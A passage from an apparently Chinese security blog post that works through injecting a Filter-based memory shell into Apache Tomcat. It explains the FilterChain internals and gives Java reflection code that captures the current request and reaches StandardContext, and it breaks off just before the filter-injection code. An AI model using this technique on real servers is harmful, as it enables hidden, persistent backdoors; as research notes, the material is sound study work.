</span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.107<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>TestFilter.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebFilter(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter init&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter doFilter &quot;</span>);  </span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Filter destroy&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TestServlet.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tomcat会自动扫描到并加载我们编写的filter<br>断点打在编写的doFilter方法<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250723201259.png" alt="image.png"></p><h4 id="请求如何到达Filter"><a href="#请求如何到达Filter" class="headerlink" title="请求如何到达Filter"></a>请求如何到达Filter</h4><p>具体调试过程就不记录了<br>总之调试加阅读tomcat架构原理可以理出以下逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724003839.png" alt="image.png"><br>Wrapper的最后一个Valve也就是StandardWrapperValve会创建一个Filter链并进行调用</p><h4 id="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"><a href="#Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain" class="headerlink" title="Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain"></a>Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</h4><p>&#x3D;&#x3D;&#x3D;<code>FilterDef</code>&#x3D;&#x3D;是过滤器的抽象定义，存放这些<code>FilterDef</code>的数组被称为<code>FilterDefs</code>，每个<code>FilterDef</code>定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及<code>class</code>等，这一点可以从<code>org/apache/tomcat/util/descriptor/web/FilterDef.java</code>的代码中看出来；</p><p>&#x3D;&#x3D;<code>FilterConfigs</code>&#x3D;&#x3D;, <code>FilterDefs</code>只是过滤器的抽象定义，而<code>FilterConfigs</code>则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；</p><p>&#x3D;&#x3D;<code>FilterMaps</code>&#x3D;&#x3D;，它是用于将<code>FilterConfigs</code>映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的<code>FilterConfigs</code>，从而确定要执行的过滤器链；</p><p>&#x3D;&#x3D;<code>FilterChain</code>&#x3D;&#x3D;是由多个<code>FilterConfigs</code>组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照<code>FilterChain</code>中的顺序依次执行每个过滤器，对请求进行过滤和处理。</p><h4 id="FilterChain创建"><a href="#FilterChain创建" class="headerlink" title="FilterChain创建"></a>FilterChain创建</h4><p>FilterChain创建由StandardWrapperValve创建<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724004559.png" alt="image.png"></p><p>跟进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724005632.png" alt="image.png"></p><p>可以看见首先是<code>context.findFilterMaps()</code>找到context中已经存在的<code>FilterMaps</code>, 再遍历<code>FilterMaps</code>, 由<code>FilterMap</code>在已存在的filterConfigs中找到具体的<code>filterConfig</code></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010043.png" alt="image.png"></p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010115.png" alt="image.png"></p><p>由于Filter是&#x3D;&#x3D;动态创建&#x3D;&#x3D;的, 要打入内存马的话, 理论上反射修改这两个map就可以了</p><p>对于FilterMap, StandardContext提供了两个方法来直接添加</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724010715.png" alt="image.png"><br>看上层接口注释, 其中<code>addFilterMapBefore</code>可以将FilterMap放在第一位<br>需要注意的是, 这两个方法都要经过<code>validateFilterMap</code>的验证, 主要是验证是否存在对应的<code>FilterDef</code>, 所以还要反射修改对应的<code>filterDefs</code></p><h4 id="内存马构造"><a href="#内存马构造" class="headerlink" title="内存马构造"></a>内存马构造</h4><h5 id="获取-StandardContext对象"><a href="#获取-StandardContext对象" class="headerlink" title="获取 StandardContext对象"></a>获取 <code>StandardContext</code>对象</h5><p>想要修改&#x3D;&#x3D;<code>StandardContext</code>&#x3D;&#x3D;中的&#x3D;&#x3D;<code>FilterMap</code>, <code>FilterDefs</code>, <code>FilterConfigs</code>&#x3D;&#x3D;, 就必须先拿到当前的<code>StandardContext</code>, 假如有这样一个反序列化入口, 我们想拿到<code>StandardContext</code>, 大部分文章都是从request入手<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215414.png" alt="image.png"></p><p>request对象上层接口可以获取当前session<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215733.png" alt="image.png"><br>而session的上层接口定义了它可以获取ServletContext<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725215837.png" alt="image.png"></p><p>当然这只是一层接口, 实际上拿到的类有没有实现这几个接口, 返回的对象具体是什么类型, 还得去调试看看</p><p>可以看见<br>我们真正拿到的类是一个<code>RequestFacade</code> 这是[[Facade模式]]运用, </p><p>其目的是屏蔽tomcat核心接口(例如直接动态得插入filter等), 只暴露允许用户操作的接口</p><p>直接转到类中<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725231413.png" alt="image.png"></p><p><code>RequestFacade</code>是<code>HttpServletRequest</code>的实现类, <code>HttpServletRequest</code>是<code>ServletRequest</code>的实现类<br><code>RequestFacade</code>实现了<code>getServletContext()</code>方法, 返回了一个<code>ServletContext</code>,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725231800.png" alt="image.png"><br>具体返回的是什么类, 也得调试看一下<br>写个demo看一下,<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233413.png" alt="image.png"></p><p>拿到的其实是<code>org.apache.catalina.core.ApplicationContextFacade</code>, 依旧是[[Facade模式]]的Facade<br>找到这个类, 看一下结构有一个<code>ApplicationContext</code>类型的属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233112.png" alt="image.png"><br>再深入<code>ApplicationContext</code>里存着<code>StandardContext</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250725233152.png" alt="image.png"></p><p>梳理一下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726004757.png" alt="image.png"></p><p>这样确实能拿到StandardContext, 但是实际打内存马的时候是类加载, 从哪去找这个RequestFacade对象?</p><h6 id="通过lastServicedRequest"><a href="#通过lastServicedRequest" class="headerlink" title="通过lastServicedRequest"></a>通过<code>lastServicedRequest</code></h6><blockquote><p>为了<strong>在 filter&#x2F;servlet 执行期间，允许某些外部工具（如 JMX 或调试器）访问当前请求对象</strong>。Tomcat 把 <code>lastServicedRequest</code>&#x2F;<code>Response</code> 放在 <code>ApplicationFilterChain</code> 类中<br>    —来自ai解释</p></blockquote><p>当<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为true时, 这里是会放进去<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726010004.png" alt="image.png"><br>这是两个静态属性<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250726010252.png" alt="image.png"><br>也就是说可以直接访问到, 因此直接反射修改即可, 但是需要注意的是, 修改<code>WRAP_SAME_OBJECT</code>为true后, 下一次请求才会把request和respone保存进去, 所以想打进去内存马就得发两次请求,<br>第一次请求&#x3D;&#x3D;设置<code>WRAP_SAME_OBJECT</code>为true并为<code>lastServicedRequest</code> <code>lastServicedResponse</code>这两个静态变量赋值&#x3D;&#x3D;,<br>第二次请求&#x3D;&#x3D;触发<code>lastServicedRequest.set(request);</code>并拿到request&#x3D;&#x3D;</p><p>并且如果<code>WRAP_SAME_OBJECT</code>为true一直为true的话,  <code>lastServicedRequest</code>是会被置空的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729163709.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">              </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">              </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">              </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次请求后顺利拿到<code>RequestFacade</code><br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729171612.png" alt="image.png"></p><p>进一步拿到StandardContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;request: &quot;</span> + req.getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;request.getServletContext(): &quot;</span> + req.getServletContext().getClass().getName());  </span><br><span class="line">        System.out.println(<span class="string">&quot;got request: &quot;</span> + getRequestFacadeFromThreadLocal().getClass().getName());  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello world&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250729173924.png" alt="image.png"><br>可以看见这里获取的就是我们的StandardContext</p><h6 id="通过Thread"><a href="#通过Thread" class="headerlink" title="通过Thread"></a>通过Thread</h6><p>pass</p><p>接下来就是去修改 <code>FilterDef</code>, <code>FilterConfigs</code>, <code>FilterMaps</code><br>这块主要还是靠自己边看边这几个类的结构边写代码, 我的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 